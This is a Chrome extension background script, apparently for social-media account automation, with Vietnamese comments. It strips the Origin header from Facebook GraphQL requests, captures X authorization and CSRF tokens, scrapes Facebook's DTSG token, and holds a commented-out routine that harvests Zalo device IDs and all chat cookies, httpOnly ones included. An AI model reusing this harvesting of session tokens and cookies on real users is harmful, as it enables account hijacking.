import { ERemoteMessageType } from "src/constants/enum"
import { checkExtensionVersion } from "./utils/common.util"

chrome.action.onClicked.addListener(() => {
  chrome.runtime.openOptionsPage()
})

let xHeadersData: any = null

chrome.runtime.onInstalled.addListener(async () => {
  const rules = [
    {
      id: 1,
      priority: 1,
      action: {
        type: "modifyHeaders",
        requestHeaders: [
          {
            header: "Origin",
            operation: "remove"
          }
        ]
      },
      condition: {
        urlFilter: "https://www.facebook.com/api/graphql/*",
        resourceTypes: ["xmlhttprequest"]
      }
    }
  ]

  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1],
    addRules: rules as any
  })

  console.log(
    "Rule to remove Origin header for Facebook GraphQL API has been applied."
  )
})

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const headers = details.requestHeaders || []
    const authorization =
      headers.find((h) => h.name.toLowerCase() === "authorization")?.value || ""
    const xCsrfToken =
      headers.find((h) => h.name.toLowerCase() === "x-csrf-token")?.value || ""

    // Lưu header mới nhất
    if (authorization && xCsrfToken) {
      xHeadersData = {
        authorization,
        xCsrfToken
      }
    }
  },
  { urls: ["*://x.com/i/api/graphql/*"] },
  ["requestHeaders", "extraHeaders"]
)

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === ERemoteMessageType.RETRIEVE_X_ACCOUNT_CREDENTIALS) {
    sendResponse(xHeadersData)
  }
  if (message.action === "FB_DTSG") {
    const profileUrl = `https://www.facebook.com/profile.php?id=${message.c_user}`;
    fetch(profileUrl)
      .then(response => response.text())
      .then(pageContent => {
        const regexPattern = /DTSGInitialData(.?)+IntlPhonologicalRules/gm;
        const match = pageContent.match(regexPattern);
        const token = (match && match.length > 0) ? match[0].split("\"")[4] : null;
        sendResponse(token);
      })
      .catch(err => {
        console.error("Có lỗi xảy ra:", err);
        sendResponse(null);
      })
      .finally(() => {
        // đảm bảo kết thúc
        return true;
      });

    return true; // giữ kênh mở
  }
})

function captureRequestsZalo() {
  chrome.webRequest.onBeforeRequest.addListener(function (details) {
    let url = details.url;
    let imeiFound = false;
    let imeiValue = "Not Found";

    // imeiValue = localStorage.getItem("z_uuid"); // === sh_z_uuid
    if (url.includes("/api/login/getServerInfo") && url.indexOf("imei=") > -1) {
      let params = new URLSearchParams(new URL(url).search);
      imeiFound = true;
      imeiValue = String(params.get("imei"));
      chrome.runtime.sendMessage({ action: "IMEIValue", imei: imeiValue });

    }

    if (imeiFound && url.includes("chat.zalo.me")) {
      chrome.cookies.getAll({ url: url }, function (cookies) {
        let parsedCookies = cookies.map(cookie => ({
          domain: cookie.domain,
          expirationDate: cookie.expirationDate || null, // (Date.now() / 1000) + (84600 * 365) - 1 year
          hostOnly: cookie.hostOnly,
          httpOnly: cookie.httpOnly,
          name: cookie.name,
          path: cookie.path,
          sameSite: cookie.sameSite || "no_restriction",
          secure: cookie.secure,
          session: cookie.session,
          storeId: cookie.storeId || null,
          value: cookie.value
        }));

        chrome.runtime.sendMessage({ action: "CookiesValue", cookies: JSON.stringify(parsedCookies) });

      });

    }

    let userAgent = navigator.userAgent;
    chrome.runtime.sendMessage({ action: "UserAgent", useragent: userAgent });

  },
    { urls: ["<all_urls>"] },
    ["requestBody"]
  );
}
// captureRequestsZalo();

checkExtensionVersion()
